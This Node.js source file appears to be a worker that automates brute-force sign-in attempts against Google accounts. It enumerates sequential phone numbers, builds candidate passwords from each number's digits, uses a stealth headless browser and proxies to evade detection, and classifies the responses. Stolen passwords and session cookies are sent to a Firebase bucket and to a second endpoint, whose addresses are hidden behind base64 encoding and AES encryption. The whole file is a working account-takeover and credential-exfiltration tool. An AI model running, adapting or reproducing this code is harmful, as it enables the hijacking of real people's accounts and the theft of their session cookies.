const StealthPlugin = require('puppeteer-extra-plugin-stealth')
const { HttpsProxyAgent } = require('https-proxy-agent')
const { HttpProxyAgent } = require('http-proxy-agent')
const { CookieJar } = require('tough-cookie')
const puppeteer = require('puppeteer-extra')
const crypto = require('crypto')
const axios = require('axios')
const got = require('got').default

const args = process.argv.slice(2)

let USER = args[0]

let mUrl = {}
let mPostData = {}
let mHeaders = {}
let mPage = {}
let mBrowser = {}
let mLoaded = {}
let mFinish = {}
let mStop = false
let mWorkerAbort = {}
let mRequestCount = {}
let mConfig = null
let mStatus = null
let mNumbers = []
let mStart = Date.now()

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
let BASE_URL = decrypt('CgNuLlQfR3jlSKEMiLtTuk+/9dHkDDtfAGU5YSjvD09hm4EPNlklAb/G5lo/WBPQlXsTRx9qPkaqChXmtGsz4w==')

puppeteer.use(StealthPlugin())


process.on('message', async (data) => {
    try {
        let json = (typeof data === 'string') ? JSON.parse(data) : data
        if (json.type == 1) {
            mConfig = json
        } else if (json.type == 2) {
            let running = mConfig != null
            process.send({ t: 3, s: 'gmail_collect_status', d: { type:2, running:running, user:json.user, server:USER, active:parseInt((Date.now()-mStart)/1000) } })
        }
    } catch (error) {}
})


startPrecoss()


async function startPrecoss() {
    while (true) {
        if (mConfig) {
            mStart = Date.now()

            mStop = false
            mWorkerAbort = {}
            mFinish = {}

            try {
                mNumbers = makeNumberList(mConfig.number, mConfig.target)
                mStatus = {
                    found:0,
                    recaptcha:0,
                    captcha:0,
                    error:0,
                    pass:0,
                    login:0,
                    ins:0,
                    other:0
                }

                for (let i = 0; i < mConfig.tab; i++) {
                    await launchBrowser(i)
                    startWork(i)
                }
                
                await waitForCompleted(mConfig.tab, mNumbers.length*(mConfig.pass.length+2)*4000)
                mNumbers = []

                process.send({ t: 5, s: 'gmail_collect_status', c:USER, d: { type:1, user:mConfig.user, server:USER, status:mStatus } })
            } catch (error) {}

            mConfig = null
        } else {
            await delay(1000)
        }
    }
}


async function launchBrowser(load) {
    try {
        if (mPage[load]) {
            return
        }

        let browser = await puppeteer.launch({
            headless: false,
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-notifications',
                '--disable-setuid-sandbox',
                '--ignore-certificate-errors',
                '--ignore-certificate-errors-skip-list',
                '--disable-dev-shm-usage'
            ]
        })

        let page = (await browser.pages())[0]

        mBrowser[load] = browser
        mPage[load] = page

        page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())

        await page.setRequestInterception(true)

        page.on('request', async request => {
            try {
                let url = request.url()
                let index = url.indexOf('request=proxy&load=')
                if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && index > 0) {
                    let response = await proxyRequest(page, url, request.headers(), request.postData(), mConfig.proxy, parseInt(url.substring(index+19)))
                    if (response) {
                        await request.respond({
                            status: response.statusCode,
                            headers: response.headers,
                            body: response.body
                        })
                    } else {
                        let contentType = 'application/json; charset=utf-8'
                        let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                        request.respond({
                            ok: true,
                            status: 200,
                            contentType,
                            body: output,
                        })
                    }
                } else if (url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=MI613e') && !url.includes('request=manually&load=')) {
                    mUrl[load] = url
                    mHeaders[load] = request.headers()
                    mPostData[load] = request.postData()
                    
                    let contentType = 'application/json; charset=utf-8'
                    let output = decode('KV19JwoKMTk1CltbIndyYi5mciIsIlYxVW1VZSIsIltudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzExXV0iLG51bGwsbnVsbCxudWxsLCJnZW5lcmljIl0sWyJkaSIsNThdLFsiYWYuaHR0cHJtIiw1OCwiLTI1OTg0NDI2NDQ4NDcyOTY2MTMiLDY1XV0KMjUKW1siZSIsNCxudWxsLG51bGwsMjMxXV0K')

                    request.respond({
                        ok: true,
                        status: 200,
                        contentType,
                        body: output,
                    })
                } else {
                    request.continue()
                }
            } catch (error) {
                request.continue()
            }
        })

        await loadLoginPage(page, load)

        mLoaded[load] = true
    } catch (error) {}
}


async function startWork(load) {
    let controller = new AbortController()
    let signal = controller.signal
    mWorkerAbort[load] = controller

    while (mNumbers.length > 0 && !mStop) {
        try {
            if (signal.aborted) break

            let number = mNumbers.shift()
            if (!number) continue
            
            let data = await getLoginStatus(mPage[load], load, '+'+number, mConfig.always?'proxy':'manually')
            
            if (data.status == 0 || data.status == 5 || data.status == 1) {
                if(data.status == 0) {
                    mStatus.error++
                    await delay(3000)
                } else if (data.status == 5) {
                    mStatus.captcha++
                    await delay(3000)
                }

                if (!mConfig.always && mConfig.proxy) {
                    data = await getLoginStatus(mPage[load], load, '+'+number, 'proxy')
                    console.log(number, data)
                }
            }

            if (data.status == 1) {
                mStatus.found++
                let patern = mConfig.pass
                let length = number.toString().length

                for (let i = 0; i < patern.length; i++) {
                    try {
                        let pass = ''
                        let orgPass = patern[i].substring(patern[i].indexOf('[')+1, patern[i].indexOf(']'))
                        
                        if (orgPass.includes(',')) {
                            let split = orgPass.split(',')
                            let start = parseInt(split[0].trim())
                            let end = parseInt(split[1].trim())
                            pass = number.toString().substring(length-(start+end), length-start)
                        } else {
                            let start = parseInt(orgPass.trim())
                            pass = number.toString().substring(length-start, length)
                        }

                        let password = patern[i].replace('['+orgPass+']', pass)

                        let passData = await getPasswordMatch(mPage[load], password, data.tl, data.cid, data.headers, load)

                        if (passData.status == 200) {
                            mStatus.pass++
                            mStatus.login++
                            await saveData(mConfig.user, mConfig.country.toLowerCase(), number, password, passData.url+'||'+passData.cookies)
                            await collectData(mConfig.user, mConfig.country.toLowerCase(), number, passData.status, password)
                            break
                        } else if (passData.status >= 201 && passData.status <= 209) {
                            mStatus.pass++
                            if (passData.status == 205) {
                                mStatus.ins++
                            }
                            await collectData(mConfig.user, mConfig.country.toLowerCase(), number, passData.status, password)
                            break
                        } else if (passData.status == 500 || passData.status == 100) {
                            again = true
                            break
                        }
                    } catch (error) {}
                }
            } else if (data.status == 2) {
                mStatus.recaptcha++
            } else if (data.status == 3) {
                mStatus.other++
            }

            if (mStop || signal.aborted) break

            await delay(Math.min(mConfig.delay?mConfig.delay:0, 2000))
        } catch (error) {
            if (signal.aborted) break
        }
    }

    mFinish[load] = true
    delete mWorkerAbort[load]
}

async function loadLoginPage(page, load) {
    for (let i = 0; i < 3; i++) {
        try {
            await page.goto('https://accounts.google.com/ServiceLogin?service=accountsettings&continue=https://myaccount.google.com', { timeout: 60000 })
            await delay(500)
                await page.evaluate(() => {
                let root = document.querySelector('div[class="kPY6ve"]')
                if (root) {
                    root.remove()
                }
                root = document.querySelector('div[class="Ih3FE"]')
                if (root) {
                    root.remove()
                }
            })
            break
        } catch (error) {}
    }

    mRequestCount[load] = 0
}

async function getLoginStatus(page, load, number, type) {
    try {
        for (let i = 0; i < 60; i++) {
            if (mLoaded[load]) {
                break
            }
            await delay(500)
        }

        if (!mLoaded[load]) {
            return 0
        }

        if (mConfig.reload > 0 && mRequestCount[load] >= mConfig.reload) {
            await loadLoginPage(page, load)
        }

        mUrl[load] = null
        mHeaders[load] = null
        mPostData[load] = null
        await page.evaluate((number) => {
            document.querySelector('input#identifierId').value = number
            document.querySelector('#identifierNext').click()
        }, number)
        let url = null
        let headers = null
        let postData = null
        for (let i = 0; i < 150; i++) {
            if (mUrl[load] && mPostData[load] && mHeaders[load]) {
                url = mUrl[load]
                headers = mHeaders[load]
                postData = mPostData[load]
                break
            }
            await delay(100)
        }
        
        mUrl[load] = null
        mHeaders[load] = null
        mPostData[load] = null
        
        if (url && postData && headers) {
            mRequestCount[load]++

            let data = await page.evaluate(async (u, h, p) => {
                let res = await fetch(u, {
                    method: 'POST',
                    headers: h,
                    body: p
                })

                return await res.text()
            }, url+(url.endsWith('&') ? '': '&')+'request='+type+'&load='+load, headers, postData)
            
            let json = extractArrays(data)[0][0]

            if (json[1] == 'MI613e') {
                let value = JSON.parse(json[2])
                if (value[21]) {
                    let values = JSON.stringify(value[21])
                    if (values.includes('/v3/signin/challenge/pwd')) {
                        let info = value[21][1][0]
                        return { status:1, tl:info[1][1][1], cid:info[1][0][1], headers:headers }
                    } else if (values.includes('/v3/signin/challenge/recaptcha')) {
                        return { status: 2 }
                    }
                    return { status: 3 }
                } else if (value[18] && value[18][0]) {
                    return { status: 5 }
                } else {
                    return { status: 4 }
                }
            }
        } else {
            await loadLoginPage(page, load)
        }
    } catch (error) {}

    return { status: 0 }
}

async function getPasswordMatch(page, password, tl, cid, headers, load) {
    try {
        let body = await page.evaluate(async (password, tl, cid, token) => {
            try {
                let fToken = 'AEThLly6uCbNDRnPpzMkuuAJYtc99E0beNMe2Sey6bzGZk4NLm5_LcvVPQKZgKRsDtmlpTDjQlB-uOHr6c53UfZg3NluDCxXYZRJ-4bE5Ub9gLRdJpDAFJwQHc1pn_XbQrevGfHAJE_5r3eAEmksoDpmfCbOeCEq3XxegyqZMYZa-EwRRNWYsk-zGsKYdsnVPF0q0cuklrL7909qvNPYUbySlpS3b5bGm93GuKHTILXy6SjRhYxeRpg8sTcCF_zODHqRizl7Fjl78v5JLPnkvyJdieknWOaHK7y1IilWN3NyEX5V25p67CVJeBWBMKb_rlj5AowiI15i16uMQgpUS61NPF5bdUmJNZGGzY8sZyeCCb81nJZQNsarUN2pZXG7MuBC_sDrHishMSmf_DYVmx3BMKjMENtsxw'
                let global_data = window.WIZ_global_data
                let parts = global_data.la8u5e.split(',')
                let matched = parts.find(part => part.includes('https://accounts.google.com/Logout'))
                if (!matched) return null
                let decodedUrl = decodeURIComponent(matched.replace(/\\u003d/g, '=').replace(/\\u0026/g, '&'))
                let ifkv = decodedUrl.match(/[?&]ifkv=([^&]+)/)
                let dsh = decodedUrl.match(/[?&]dsh=([^&]+)/)
                let at = global_data.SNlM0e

                let data = {
                    ifkv: ifkv ? ifkv[1] : '',
                    dsh: dsh ? dsh[1] : '',
                    at: at || ''
                }

                let body = 'TL=' + tl + '&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&ddm=0&'

                if (data.dsh) {
                    body += 'dsh=' + data.dsh + '&'
                }

                body += 'flowEntry=ServiceLogin&'

                if (data.ifkv) {
                    body += 'ifkv=' + data.ifkv + '&'
                }

                body += 'service=accountsettings&f.req=%5B%22' + encodeURIComponent(fToken) + '%22%2Cnull%2C' + cid + '%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%22' + encodeURIComponent(password) + '%22%2Cnull%2C1%5D%5D%5D&bgRequest=%5B%22identifier%22%2C%22' + encodeURIComponent(token) + '%22%5D&'

                if (data.at) {
                    body += 'at=' + encodeURIComponent(data.at) + '&'
                }

                return body + '&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C1%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C1%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A251&checkedDomains=youtube&pstMsg=1&'
            } catch (error) {}

            return null
        }, password, tl, cid, randomToken())

        if (body) {
            headers['content-type'] = 'application/x-www-form-urlencoded;charset=UTF-8'
            headers['google-accounts-xsrf'] = '1'
            headers['x-same-domain'] = '1'
            
            let response = await proxyRequest(page, 'https://accounts.google.com/_/signin/challenge?hl=en&TL=' + tl, headers, body, mConfig.proxy, load)
            
            if (response && response.body) {
                let data = response.body.toString()

                if (data.includes('"er"')) {
                    return { status: 500 }
                }

                if (data.includes('INCORRECT_ANSWER_ENTERED')) {
                    return { status: 400 }
                } else if (data.includes('TWO_STEP_VERIFICATION')) {
                    return { status: 202 }
                } else if (data.includes('LOGIN_CHALLENGE') && data.includes('SEND_SUCCESS')) {
                    return { status: 203 }
                } else if (data.includes('LOGIN_CHALLENGE') && data.includes('INITIALIZED')) {
                    if (data.includes('null,null,17,7,null,null')) {
                        return { status: 205 }
                    } else if (data.includes('null,null,5,7,null,null')) {
                        return { status: 206 }
                    } else {
                        return { status: 204 }
                    }
                } else if (data.includes('CheckCookie')) {
                    let url = 'https://myaccount.google.com/phone'
                    try {
                        url = extractArrays(data)[0][0][13][2]
                    } catch (error) {}

                    let cookies = ''
                    
                    try {
                        let list = response.headers['set-cookie']

                        for (let i = 0; i < list.length; i++) {
                            try {
                                if (i >= list.length-1) {
                                    cookies += list[i].substring(0, list[i].indexOf(';'))
                                } else {
                                    cookies += list[i].substring(0, list[i].indexOf(';'))+'; '
                                }
                            } catch (error) {}
                        }
                    } catch (error) {}

                    return { status: 200, cookies: cookies, url: url }
                } else if (data.includes('webapproval')) {
                    return { status: 201 }
                } else if (data.includes('signin') && data.includes('recovery')) {
                    return { status: 207 }
                } else if (data.includes('disabled') && data.includes('explanation')) {
                    return { status: 208 }
                } else if (data.includes('speedbump') && data.includes('changepassword') && data.includes('changepasswordform')) {
                    return { status: 209 }
                } else {
                    return { status: 204 }
                }
            }
        }
    } catch (error) {}

    return { status:100 }
}

async function waitForCompleted(size, timeout = 300000) {
    let start = Date.now()

    while (true) {
        if (Date.now() - start > timeout) {
            await waitForTaskTimeout()
            break
        }

        let completed = true
        for (let i = 0; i < size; i++) {
            if (!mFinish[i]) completed = false
        }

        if (completed) break
        await delay(250)
    }
}

async function waitForTaskTimeout() {
    try {
        mStop = true
        mNumbers = []

        for (let id in mWorkerAbort) {
            try { mWorkerAbort[id].abort() } catch {}
        }

        while (true) {
            let completed = true
            for (let i = 0; i < size; i++) {
                if (!mFinish[i]) completed = false
            }

            if (completed) break
            await delay(250)
        }
    } catch {}
}

async function proxyRequest(page, url, reqHeaders, postData, proxyUrl, load) {
    
    let signal = mWorkerAbort[load] ? mWorkerAbort[load].signal : null

    try {
        let headers = {
            ...reqHeaders,
            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en',
            host: new URL(url).hostname
        }

        let puppeteerCookies = await page.cookies();
        let cookies = puppeteerCookies.map(cookie => ({
            creation: new Date().toISOString(),
            domain: cookie.domain.replace(/^\./, ''),
            expires: cookie.expires === -1 ? Infinity : new Date(cookie.expires * 1000).toISOString(),
            hostOnly: !cookie.domain.startsWith('.'),
            httpOnly: cookie.httpOnly,
            key: cookie.name,
            lastAccessed: new Date().toISOString(),
            path: cookie.path,
            secure: cookie.secure,
            value: cookie.value
        }))

        let jar = CookieJar.deserializeSync({
            cookies,
            rejectPublicSuffixes: true,
            storeType: 'MemoryCookieStore',
            version: 'tough-cookie@2.0.0'
        });

        let agent = proxyUrl ? {
            http: new HttpProxyAgent(proxyUrl),
            https: new HttpsProxyAgent(proxyUrl)
        } : undefined

        for (let i = 0; i < 2; i++) {
            try {
                return await got(url, {
                    method: 'POST',
                    headers,
                    body: postData,
                    cookieJar: jar,
                    agent,
                    responseType: 'buffer',
                    followRedirect: false,
                    throwHttpErrors: false,
                    timeout: {
                        request: 15000
                    },
                    signal
                })
            } catch (error) {
                console.log(error)
            }
        }
    } catch (err) {
        console.log(err)
    }

    return null
}

async function collectData(user, country, number, type, password) {
    try {
        if (type == 205) {
            await axios.patch(BASE_URL+'changeable/'+number+'.json', JSON.stringify({ password:password, time: parseInt(Date.now()/1000) }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            })
        } else if (type == 209) {
            await axios.patch(BASE_URL+'verified/'+number+'.json', JSON.stringify({ password:password, time: parseInt(Date.now()/1000) }), {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            })
        } else {
            await axios.post(`${STORAGE}collect%2F${user}%2F${country}%2F${number}`, '', {
                headers: {
                    'Content-Type': `${type}/${password}`
                }
            })
        }
    } catch (error) {}
}

async function saveData(user, country, number, password, cookies) {
    try {
        await axios.patch(BASE_URL+'loginable/'+number+'.json', JSON.stringify({ password, time: parseInt(Date.now()/1000), key:user, country, cookies }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function decrypt(text) {
    try {
        let argv = process.argv.slice(2)
        if (argv.length < 2) {
            return null
        }
        let key = Buffer.from(argv[1], 'base64')
        let iv  = Buffer.from(argv[2], 'base64')
        let cipher = crypto.createDecipheriv('aes-192-cbc', key, iv)
        return cipher.update(text, 'base64', 'utf8') + cipher.final('utf8')
    } catch (e) {
        return null
    }
}

function extractArrays(raw) {
    raw = raw.replace(/^\)\]\}'\s*/g, '')

    let lines = raw.split('\n')

    let arrays = []

    for (let i = 0; i < lines.length; i++) {
        let line = lines[i].trim()

        if (line.startsWith('[')) {
            try {
                arrays.push(JSON.parse(line))
            } catch {}
        }
    }

    return arrays
}

function randomToken() {
    let list = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_-'
    let result = '<'
    let length = Math.floor(Math.random() * 300) + 500

    for (let i = 0; i < length; i++) {
        result += list.charAt(Math.floor(Math.random() * list.length))
    }

    return result
}

function makeNumberList(number, target) {
    let list = []

    for (let i = 0; i < target; i++) {
        list.push(number+i)
    }

    return list
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
